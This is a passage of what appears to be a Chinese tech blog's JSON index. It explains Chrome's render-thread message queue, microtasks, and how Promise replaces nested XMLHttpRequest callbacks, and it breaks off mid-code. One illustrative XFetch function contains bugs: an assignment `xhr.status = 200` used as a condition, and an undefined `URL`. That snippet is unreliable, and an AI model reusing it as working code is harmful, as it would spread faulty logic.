data-src=\"https://pic.imgdb.cn/item/6638ad9c0ea9cb14039d1550.png\" alt=\"渲染进程线程之间发送任务\"></p>\n<p>从上图可以看出，渲染主线程会频繁接收到来自于 IO 线程的一些任务，接收到这些任务之后，渲染进程就需要着手处理，比如接收到资源加载完成的消息后，渲染进程就要着手进行 DOM 解析了；接收到鼠标点击的消息后，渲染主线程就要开始执行相应的 JavaScript 脚本来处理该点击事件。</p>\n<p>那么如何设计好一个线程模型，能让其能够接收其他线程发送的消息呢？</p>\n<p>一个通用模式是使用<strong>消息队列</strong>。在解释如何实现之前，我们先说说什么是消息队列，可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6638adbc0ea9cb14039d558d.png\" alt=\"消息队列\"></p>\n<p>从图中可以看出，<strong>消息队列是一种数据结构，可以存放要执行的任务</strong>。它符合队列 “<strong>先进先出</strong>” 的特点，也就是说要<strong>添加任务的话，添加到队列的尾部；要取出任务的话，从队列头部去取</strong>。</p>\n<p>有了队列之后，我们就可以继续改造线程模型了，改造方案如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6638adfb0ea9cb14039ddc3f.png\" alt=\"第三版线程模型：队列+循环\"></p>\n<p>从上图可以看出，我们的改造可以分为下面三个步骤：</p>\n<ol>\n<li>添加一个消息队列；</li>\n<li>IO 线程中产生的新任务添加进消息队列尾部；</li>\n<li>渲染主线程会循环地从消息队列头部中读取任务，执行任务。<br>有了这些步骤之后，那么接下来我们就可以按步骤使用代码来实现第三版的线程模型。</li>\n</ol>\n<p>首先，构造一个队列。当然，在本篇文章中我们不需要考虑队列实现的细节，只是构造队列的接口：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TaskQueue</span>{</span><br><span class=\"line\">  <span class=\"keyword\">public</span>:</span><br><span class=\"line\">  <span class=\"function\">Task <span class=\"title\">takeTask</span><span class=\"params\">()</span></span>; <span class=\"comment\">//取出队列头部的一个任务</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">pushTask</span><span class=\"params\">(Task task)</span></span>; <span class=\"comment\">//添加一个任务到队列尾部</span></span><br><span class=\"line\">};</span><br></pre></td></tr></tbody></table></figure>\n\n<p>接下来，改造主线程，让主线程从队列中读取任务：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">TaskQueue task_queue；</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ProcessTask</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">MainThread</span><span class=\"params\">()</span></span>{</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(;;){</span><br><span class=\"line\">    Task task = task_queue.<span class=\"built_in\">takeTask</span>();</span><br><span class=\"line\">    <span class=\"built_in\">ProcessTask</span>(task);</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>在上面的代码中，我们添加了一个消息队列的对象，然后在主线程的 for 循环代码块中，从消息队列中读取一个任务，然后执行该任务，主线程就这样一直循环往下执行，因此只要消息队列中有任务，主线程就会去执行。</p>\n<p>主线程的代码就这样改造完成了。这样改造后，主线程执行的任务都全部从消息队列中获取。所以如果有其他线程想要发送任务让主线程去执行，只需要将任务添加到该消息队列中就可以了，添加任务的代码如下：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">Task clickTask;</span><br><span class=\"line\">task_queue.<span class=\"built_in\">pushTask</span>(clickTask)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>由于是多个线程操作同一个消息队列，所以在添加任务和取出任务时还会加上一个同步锁，这块内容你也要注意下。</p>\n<h2 id=\"处理其他进程发送过来的任务\"><a href=\"#处理其他进程发送过来的任务\" class=\"headerlink\" title=\"处理其他进程发送过来的任务\"></a>处理其他进程发送过来的任务</h2><p>通过使用消息队列，我们实现了线程之间的消息通信。在 Chrome 中，跨进程之间的任务也是频繁发生的，那么如何处理其他进程发送过来的任务？你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6638ae5e0ea9cb14039ea69e.png\" alt=\"跨进程发送消息\"></p>\n<p>从图中可以看出，<strong>渲染进程专门有一个 IO 线程用来接收其他进程传进来的消息</strong>，接收到消息之后，会将这些消息组装成任务发送给渲染主线程，后续的步骤就和前面讲解的 “处理其他线程发送的任务” 一样了，这里就不再重复了。</p>\n<h2 id=\"消息队列中的任务类型\"><a href=\"#消息队列中的任务类型\" class=\"headerlink\" title=\"消息队列中的任务类型\"></a>消息队列中的任务类型</h2><p>现在你知道页面主线程是如何接收外部任务的了，那接下来我们再来看看消息队列中的任务类型有哪些。你可以参考下 Chromium 的官方源码，这里面包含了很多内部消息类型，如输入事件（鼠标滚动、点击、移动）、微任务、文件读写、WebSocket、JavaScript 定时器等等。</p>\n<p>除此之外，消息队列中还包含了很多与页面相关的事件，如 JavaScript 执行、解析 DOM、样式计算、布局计算、CSS 动画等。</p>\n<p>以上这些事件都是在主线程中执行的，所以在编写 Web 应用时，你还需要衡量这些事件所占用的时长，并想办法解决单个任务占用主线程过久的问题。</p>\n<h2 id=\"如何安全退出\"><a href=\"#如何安全退出\" class=\"headerlink\" title=\"如何安全退出\"></a>如何安全退出</h2><p>当页面主线程执行完成之后，又该如何保证页面主线程能够安全退出呢？Chrome 是这样解决的，确定要退出当前页面时，页面主线程会设置一个退出标志的变量，在每次执行完一个任务时，判断是否有设置退出标志。</p>\n<p>如果设置了，那么就直接中断当前的所有任务，退出线程，你可以参考下面代码：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">TaskQueue task_queue；</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ProcessTask</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"type\">bool</span> keep_running = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">MainThread</span><span class=\"params\">()</span></span>{</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(;;){</span><br><span class=\"line\">    Task task = task_queue.<span class=\"built_in\">takeTask</span>();</span><br><span class=\"line\">    <span class=\"built_in\">ProcessTask</span>(task);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!keep_running) <span class=\"comment\">//如果设置了退出标志，那么直接退出线程循环</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span>; </span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"页面使用单线程的缺点\"><a href=\"#页面使用单线程的缺点\" class=\"headerlink\" title=\"页面使用单线程的缺点\"></a>页面使用单线程的缺点</h2><p>上面讲述的就是页面线程的循环系统是如何工作的，那接下来，我们继续探讨页面线程的一些特征。</p>\n<p>通过上面的介绍，你应该清楚了，页面线程所有执行的任务都来自于消息队列。消息队列是 “先进先出” 的属性，也就是说放入队列中的任务，需要等待前面的任务被执行完，才会被执行。鉴于这个属性，就有如下两个问题需要解决。</p>\n<p><strong>第一个问题是如何处理高优先级的任务</strong>。</p>\n<p>比如一个典型的场景是监控 DOM 节点的变化情况（节点的插入、修改、删除等动态变化），然后根据这些变化来处理相应的业务逻辑。一个通用的设计的是，利用 JavaScript 设计一套监听接口，当变化发生时，渲染引擎同步调用这些接口，这是一个典型的观察者模式。</p>\n<p>不过这个模式有个问题，因为 DOM 变化非常频繁，如果每次发生变化的时候，都直接调用相应的 JavaScript 接口，那么这个当前的任务执行时间会被拉长，从而导致<strong>执行效率的下降</strong>。</p>\n<p>如果将这些 DOM 变化做成异步的消息事件，添加到消息队列的尾部，那么又会影响到监控的实时性，因为在添加到消息队列的过程中，可能前面就有很多任务在排队了。</p>\n<p>这也就是说，如果 DOM 发生变化，采用同步通知的方式，会影响当前任务的<strong>执行效率</strong>；如果采用异步方式，又会影响到<strong>监控的实时性</strong>。</p>\n<p>那该如何权衡<strong>效率</strong>和<strong>实时性</strong>呢？</p>\n<p>针对这种情况，微任务就应用而生了，下面我们来看看微任务是如何权衡效率和实时性的。</p>\n<p>通常我们把消息队列中的任务称为<strong>宏任务</strong>，每个宏任务中都包含了一个<strong>微任务队列</strong>，在执行宏任务的过程中，如果 DOM 有变化，那么就会将该变化添加到微任务列表中，这样就不会影响到宏任务的继续执行，因此也就解决了执行效率的问题。</p>\n<p>等宏任务中的主要功能都直接完成之后，这时候，渲染引擎并不着急去执行下一个宏任务，而是执行当前宏任务中的微任务，因为 DOM 变化的事件都保存在这些微任务队列中，这样也就解决了实时性问题。</p>\n<p><strong>第二个是如何解决单个任务执行时长过久的问题</strong>。</p>\n<p>因为所有的任务都是在单线程中执行的，所以每次只能执行一个任务，而其他任务就都处于等待状态。如果其中一个任务执行时间过久，那么下一个任务就要等待很长时间。可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6638af0a0ea9cb1403a00575.png\" alt=\"单个任务执行时间过久\"></p>\n<p>从图中你可以看到，如果在执行动画过程中，其中有个 JavaScript 任务因执行时间过久，占用了动画单帧的时间，这样会给用户制造了卡顿的感觉，这当然是极不好的用户体验。针对这种情况，JavaScript 可以通过回调功能来规避这种问题，也就是让要执行的 JavaScript 任务滞后执行。至于浏览器是如何实现回调功能的，我们在后面的章节中再详细介绍。</p>\n<h2 id=\"实践：浏览器页面是如何运行的\"><a href=\"#实践：浏览器页面是如何运行的\" class=\"headerlink\" title=\"实践：浏览器页面是如何运行的\"></a>实践：浏览器页面是如何运行的</h2><p>有了上面的基础知识之后，我们最后来看看浏览器的页面是如何运行的。</p>\n<p>你可以打开开发者工具，点击 “Performance” 标签，选择左上角的 “start porfiling and load page” 来记录整个页面加载过程中的事件执行情况，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6638af2e0ea9cb1403a05419.png\" alt=\"Performance页面\"></p>\n<p>从图中可以看出，我们点击展开了 Main 这个项目，其记录了主线程执行过程中的所有任务。图中灰色的就是一个个任务，每个任务下面还有子任务，其中的 Parse HTML 任务，是把 HTML 解析为 DOM 的任务。值得注意的是，在执行 Parse HTML 的时候，如果遇到 JavaScript 脚本，那么会暂停当前的 HTML 解析而去执行 JavaScript 脚本。</p>\n<p>至于 Performance 工具，在后面的章节中我们还会详细介绍，在这里你只需要建立一个直观的印象就可以了。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就讲到这里，下面我来总结下今天所讲的内容。</p>\n<ul>\n<li>如果有一些确定好的任务，可以使用一个单线程来按照顺序处理这些任务，这是第一版线程模型。</li>\n<li>要在线程执行过程中接收并处理新的任务，就需要引入循环语句和事件系统，<a href=\"/javascript/eventloop.html\">事件循环可参考</a>，这是第二版线程模型。</li>\n<li>如果要接收其他线程发送过来的任务，就需要引入消息队列，这是第三版线程模型。</li>\n<li>如果其他进程想要发送任务给页面主线程，那么先通过 IPC 把任务发送给渲染进程的 IO 线程，IO 线程再把任务发送给页面主线程。</li>\n<li>消息队列机制并不是太灵活，为了适应效率和实时性，引入了微任务。<br>基于消息队列的设计是目前使用最广的消息架构，无论是安卓还是 Chrome 都采用了类似的任务机制，所以理解了本篇文章的内容后，你再理解其他项目的任务机制也会比较轻松。</li>\n</ul>\n"},{"title":"Promise：使用 Promise，告别回调函数","url":"/browser/pageEventLoop/PromiseXFetch.html","content":"<p>在<a href=\"/browser/pageEventLoop/MacroAndMicroTasks.html\">上一篇文章</a>中我们聊到了微任务是如何工作的，并介绍了 MutationObserver 是如何利用微任务来权衡性能和效率的。今天我们就接着来聊聊微任务的另外一个应用 Promise，DOM/BOM API 中新加入的 API 大多数都是建立在 Promise 上的，而且新的前端框架也使用了大量的 Promise。可以这么说，Promise 已经成为现代前端的 “水” 和 “电”，很是关键，所以深入学习 Promise 势在必行。</p>\n<p>不过，Promise 的知识点有那么多，而我们只有一篇文章来介绍，那应该怎么讲解呢？具体讲解思路是怎样的呢？</p>\n<p>如果你想要学习一门新技术，最好的方式是先了解这门技术是如何诞生的，以及它所解决的问题是什么。了解了这些后，你才能抓住这门技术的本质。所以本文我们就来重点聊聊 JavaScript 引入 Promise 的动机，以及解决问题的几个核心关键点。</p>\n<p>要谈动机，我们一般都是先从问题切入，那么 Promise 到底解决了什么问题呢？在正式开始介绍之前，我想有必要明确下，Promise 解决的是异步编码风格的问题，而不是一些其他的问题，所以接下来我们聊的话题都是围绕编码风格展开的。</p>\n<h2 id=\"异步编程的问题：代码逻辑不连续\"><a href=\"#异步编程的问题：代码逻辑不连续\" class=\"headerlink\" title=\"异步编程的问题：代码逻辑不连续\"></a>异步编程的问题：代码逻辑不连续</h2><p>首先我们来回顾下 JavaScript 的异步编程模型，你应该已经非常熟悉页面的事件循环系统了，也知道页面中任务都是执行在主线程之上的，相对于页面来说，主线程就是它整个的世界，所以在执行一项耗时的任务时，比如下载网络文件任务、获取摄像头等设备信息任务，这些任务都会放到页面主线程之外的进程或者线程中去执行，这样就避免了耗时任务 “霸占” 页面主线程的情况。你可以结合下图来看看这个处理过程：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6638a7140ea9cb14038ca1f1.png\" alt=\"Web应用的异步编程模型\"></p>\n<p>上图展示的是一个标准的异步编程模型，页面主线程发起了一个耗时的任务，并将任务交给另外一个进程去处理，这时页面主线程会继续执行消息队列中的任务。等该进程处理完这个任务后，会将该任务添加到渲染进程的消息队列中，并排队等待循环系统的处理。排队结束之后，循环系统会取出消息队列中的任务进行处理，并触发相关的回调操作。</p>\n<p>这就是页面编程的一大特点：<strong>异步回调</strong>。</p>\n<p>Web 页面的单线程架构决定了异步回调，而异步回调影响到了我们的编码方式，到底是如何影响的呢？</p>\n<p>假设有一个下载的需求，使用 XMLHttpRequest 来实现，具体的实现方式你可以参考下面这段代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//执行状态</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">onResolve</span>(<span class=\"params\">response</span>){<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response) }</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">onReject</span>(<span class=\"params\">error</span>){<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(error) }</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> xhr = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>()</span><br><span class=\"line\">xhr.<span class=\"property\">ontimeout</span> = <span class=\"keyword\">function</span>(<span class=\"params\">e</span>) { <span class=\"title function_\">onReject</span>(e)}</span><br><span class=\"line\">xhr.<span class=\"property\">onerror</span> = <span class=\"keyword\">function</span>(<span class=\"params\">e</span>) { <span class=\"title function_\">onReject</span>(e) }</span><br><span class=\"line\">xhr.<span class=\"property\">onreadystatechange</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) { <span class=\"title function_\">onResolve</span>(xhr.<span class=\"property\">response</span>) }</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//设置请求类型，请求URL，是否同步信息</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable constant_\">URL</span> = <span class=\"string\">'https://time.geekbang.com'</span></span><br><span class=\"line\">xhr.<span class=\"title function_\">open</span>(<span class=\"string\">'Get'</span>, <span class=\"variable constant_\">URL</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//设置参数</span></span><br><span class=\"line\">xhr.<span class=\"property\">timeout</span> = <span class=\"number\">3000</span> <span class=\"comment\">//设置xhr请求的超时时间</span></span><br><span class=\"line\">xhr.<span class=\"property\">responseType</span> = <span class=\"string\">\"text\"</span> <span class=\"comment\">//设置响应返回的数据格式</span></span><br><span class=\"line\">xhr.<span class=\"title function_\">setRequestHeader</span>(<span class=\"string\">\"X_TEST\"</span>,<span class=\"string\">\"time.geekbang\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//发出请求</span></span><br><span class=\"line\">xhr.<span class=\"title function_\">send</span>();</span><br></pre></td></tr></tbody></table></figure>\n\n<p>我们执行上面这段代码，可以正常输出结果的。但是，这短短的一段代码里面竟然出现了五次回调，这么多的回调会导致代码的逻辑不连贯、不线性，非常不符合人的直觉，这就是异步回调影响到我们的编码方式。</p>\n<p>那有什么方法可以解决这个问题吗？当然有，我们可以封装这堆凌乱的代码，降低处理异步回调的次数。</p>\n<h2 id=\"封装异步代码，让处理流程变得线性\"><a href=\"#封装异步代码，让处理流程变得线性\" class=\"headerlink\" title=\"封装异步代码，让处理流程变得线性\"></a>封装异步代码，让处理流程变得线性</h2><p>由于我们重点关注的是输入内容（请求信息）和输出内容（回复信息），至于中间的异步请求过程，我们不想在代码里面体现太多，因为这会干扰核心的代码逻辑。整体思路如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6638a79e0ea9cb14038dd694.png\" alt=\"封装请求过程\"></p>\n<p>从图中你可以看到，我们将 XMLHttpRequest 请求过程的代码封装起来了，重点关注输入数据和输出结果。</p>\n<p>那我们就按照这个思路来改造代码。首先，我们把输入的 HTTP 请求信息全部保存到一个 request 的结构中，包括请求地址、请求头、请求方式、引用地址、同步请求还是异步请求、安全设置等信息。request 结构如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//makeRequest用来构造request对象</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">makeRequest</span>(<span class=\"params\">request_url</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> request = {</span><br><span class=\"line\">        <span class=\"attr\">method</span>: <span class=\"string\">'Get'</span>,</span><br><span class=\"line\">        <span class=\"attr\">url</span>: request_url,</span><br><span class=\"line\">        <span class=\"attr\">headers</span>: <span class=\"string\">''</span>,</span><br><span class=\"line\">        <span class=\"attr\">body</span>: <span class=\"string\">''</span>,</span><br><span class=\"line\">        <span class=\"attr\">credentials</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">sync</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        <span class=\"attr\">responseType</span>: <span class=\"string\">'text'</span>,</span><br><span class=\"line\">        <span class=\"attr\">referrer</span>: <span class=\"string\">''</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> request</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>然后就可以封装请求过程了，这里我们将所有的请求细节封装进 XFetch 函数，XFetch 代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//[in] request，请求信息，请求头，延时值，返回类型等</span></span><br><span class=\"line\"><span class=\"comment\">//[out] resolve, 执行成功，回调该函数</span></span><br><span class=\"line\"><span class=\"comment\">//[out] reject  执行失败，回调该函数</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">XFetch</span>(<span class=\"params\">request, resolve, reject</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> xhr = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>()</span><br><span class=\"line\">    xhr.<span class=\"property\">ontimeout</span> = <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) { <span class=\"title function_\">reject</span>(e) }</span><br><span class=\"line\">    xhr.<span class=\"property\">onerror</span> = <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) { <span class=\"title function_\">reject</span>(e) }</span><br><span class=\"line\">    xhr.<span class=\"property\">onreadystatechange</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) {</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (xhr.<span class=\"property\">status</span> = <span class=\"number\">200</span>)</span><br><span class=\"line\">            <span class=\"title function_\">resolve</span>(xhr.<span class=\"property\">response</span>)</span><br><span class=\"line\">    }</span><br><span class=\"line\">    xhr.<span class=\"title function_\">open</span>(request.<span class=\"property\">method</span>, <span class=\"variable constant_\">URL</span>, request.<span class=\"property\">sync</span>);</span><br><span class=\"line\">    xhr.<span class=\"property\">timeout</span> = request.<span class=\"property\">timeout</span>;</span><br><span class=\"line\">    xhr.<span class=\"property\">responseType</span> = request.<span class=\"property\">responseType</span>;</span><br><span class=\"line\">    <span class=\"comment\">//补充其他请求信息</span></span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">    xhr.<span class=\"title function_\">send</span>();</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这个 XFetch 函数需要一个 request 作为输入，然后还需要两个回调函数 resolve 和 reject，当请求成功时回调 resolve 函数，当请求出现问题时回调 reject 函数。</p>\n<p>有了这些后，我们就可以来实现业务代码了，具体的实现方式如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">XFetch</span>(<span class=\"title function_\">makeRequest</span>(<span class=\"string\">'https://time.geekbang.org'</span>),</span><br><span class=\"line\">    <span class=\"keyword\">function</span> <span class=\"title function_\">resolve</span>(<span class=\"params\">data</span>) {</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data)</span><br><span class=\"line\">    }, <span class=\"keyword\">function</span> <span class=\"title function_\">reject</span>(<span class=\"params\">e</span>) {</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e)</span><br><span class=\"line\">    })</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"新的问题：回调地狱\"><a href=\"#新的问题：回调地狱\" class=\"headerlink\" title=\"新的问题：回调地狱\"></a>新的问题：回调地狱</h2><p>上面的示例代码已经比较符合人的线性思维了，在一些简单的场景下运行效果也是非常好的，不过一旦接触到稍微复杂点的项目时，你就会发现，如果嵌套了太多的回调函数就很容易使得自己陷入了回调地狱，不能自拔。你可以参考下面这段让人凌乱的代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">XFetch</span>(<span class=\"title function_\">makeRequest</span>(<span class=\"string\">'https://time.geekbang.org/?category'</span>),</span><br><span class=\"line\">      <span class=\"keyword\">function</span> <span class=\"title function_\">resolve</span>(<span class=\"params\">response</span>) {</span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">          <span class=\"title class_\">XFetch</span>(<span class=\"title function_\">makeRequest</span>(<span class=\"string\">'https://time.geekbang.org/column'</span>),</span><br><span class=\"line\">              <span class=\"keyword\">function</span> <span class=\"title function_\">resolve</span>(<span class=\"params\">response</span>) {</span><br><span class=\"line\">                  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">                  <span class=\"title class_\">XFetch</span>(<span class=\"title function_\">makeRequest</span>(<span class=\"string\">'https://time.geekbang.org'</span>)</span><br><span class=\"line\">                      <span class=\"keyword\">function</span> <span class=\"title function_\">resolve</span>(<span class=\"params\">response</span>) {</span><br><span class=\"line\">                          <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">                      }, <span class=\"keyword\">function</span> <span class=\"title function_\">reject</span>(<span class=\"params\">e</span>) {</span><br><span class=\"line\">                          <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e)</span><br><span class=\"line\">                      })</span><br><span class=\"line\">              }, <span class=\"keyword\">function</span> <span class=\"title function_\">reject</span>(<span class=\"params\">e</span>) {</span><br><span class=\"line\">                  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e)</span><br><span class=\"line\">              })</span><br><span class=\"line\">      }, <span class=\"keyword\">function</span> <span class=\"title function_\">reject</span>(<span class=\"params\">e</span>) {</span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e)</span><br><span class=\"line\">      })</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这段代码是先请求 <code>time.geekbang.org/?category</code>，如果请求成功的话，那么再请求 <code>time.geekbang.org/column</code>，如果再次请求成功的话，就继续请求 <code>time.geekbang.org</code>。也就是说这段代码用了三层嵌套请求，就已经让代码变得混乱不堪，所以，我们还需要解决这种嵌套调用后混乱的代码结构。</p>\n<p>这段代码之所以看上去很乱，归结其原因有两点：</p>\n<ul>\n<li><p>第一是嵌套调用，下面的任务依赖上个任务的请求结果，并在上个任务的回调函数内部执行新的业务逻辑，这样当嵌套层次多了之后，代码的可读性就变得非常差了。</p>\n</li>\n<li><p>第二是任务的不确定性，执行每个任务都有两种可能的结果（成功或者失败），所以体现在代码中就需要对每个任务的执行结果做两次判断，这种对每个任务都要进行一次额外的错误处理的方式，明显增加了代码的混乱程度。<br>原因分析出来后，那么问题的解决思路就很清晰了：</p>\n</li>\n<li><p>第一是消灭嵌套调用；</p>\n</li>\n<li><p>第二是合并多个任务的错误处理。<br>这么讲可能有点抽象，不过 Promise 已经帮助我们解决了这两个问题。那么接下来我们就来看看 Promise 是怎么消灭嵌套调用和合并多个任务的错误处理的。</p>\n</li>\n</ul>\n<h2 id=\"Promise：消灭嵌套调用和多次错误处理\"><a href=\"#Promise：消灭嵌套调用和多次错误处理\" class=\"headerlink\" title=\"Promise：消灭嵌套调用和多次错误处理\"></a>Promise：消灭嵌套调用和多次错误处理</h2><p>首先，我们使用 Promise 来重构 XFetch 的代码，示例代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">XFetch</span>(<span class=\"params\">request</span>) {</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">executor</span>(<span class=\"params\">resolve, reject</span>) {</span><br><span class=\"line\">      <span class=\"keyword\">let</span> xhr = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>()</span><br><span class=\"line\">      xhr.<span class=\"title function_\">open</span>(<span class=\"string\">'GET'</span>, request.<span class=\"property\">url</span>, <span class=\"literal\">true</span>)</span><br><span class=\"line\">      xhr.<span class=\"property\">ontimeout</span> = <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) { <span class=\"title function_\">reject</span>(e) }</span><br><span class=\"line\">      xhr.<span class=\"property\">onerror</span> = <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) { <span class=\"title function_\">reject</span>(e) }</span><br><span class=\"line\">      xhr.<span class=\"property\">onreadystatechange</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) {</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">readyState</span> === <span class=\"number\">4</span>) {</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">status</span> === <span class=\"number\">200</span>) {</span><br><span class=\"line\">                  <span class=\"title function_\">resolve</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">responseText</span>, <span class=\"variable language_\">this</span>)</span><br><span class=\"line\">              } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">                  <span class=\"keyword\">let</span> error = {</span><br><span class=\"line\">                      <span class=\"attr\">code</span>: <span class=\"variable language_\">this</span>.<span class=\"property\">status</span>,</span><br><span class=\"line\">                      <span class=\"attr\">response</span>: <span class=\"variable language_\">this</span>.<span class=\"property\">response</span></span><br><span class=\"line\">                  }</span><br><span class=\"line\">                  <span class=\"title function_\">reject</span>(error, <span class=\"variable language_\">this</span>)</span><br><span class=\"line\">              }</span><br><span class=\"line\">          }</span><br><span class=\"line\">      }</span><br><span class=\"line\">      xhr.<span class=\"title function_\">send</span>()</span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor)</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>接下来，我们再利用 XFetch 来构造请求流程，代码如下：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> x1 = <span class=\"title class_\">XFetch</span>(<span class=\"title function_\">makeRequest</span>(<span class=\"string\">'https://time.geekbang.org/?category'</span>))</span><br><span class=\"line\"><span class=\"keyword\">var</span> x2 = x1.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">value</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(value)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title class_\">XFetch</span>(<span class=\"title function_\">makeRequest</span>(<span class=\"string\">'https://www.geekbang.org/column'</span>))</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"keyword\">var</span> x3 = x2.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">value</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(value)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title class_\">XFetch</span>(<span class=\"title function_\">makeRequest</span>(<span class=\"string\">'https://time.geekbang.org'</span>))</span><br><span class=\"line\">})</span><br><span class=\"line\">x3.<span class=\"title function_\">catch</span>(<span class=\"function\"><span class=\"params\">error</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(error)</span><br><span 